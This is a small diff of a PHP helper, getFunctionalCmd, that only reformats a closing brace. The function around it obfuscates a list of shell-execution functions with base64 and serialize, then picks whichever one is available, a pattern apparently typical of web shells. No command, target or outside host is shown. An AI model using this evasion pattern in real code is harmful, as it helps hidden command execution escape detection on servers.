@@ -96,7 +96,8 @@ function getFunctionalCmd(string $cmd): string
     $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
     $obfuscated = base64_encode(serialize($funcs));
     $deobfuscate = function ($x) {
-        return unserialize(base64_decode($x)); };
+        return unserialize(base64_decode($x));
+    };
 
     foreach ($deobfuscate($obfuscated) as $func) {
         if (function_exists($func)) {
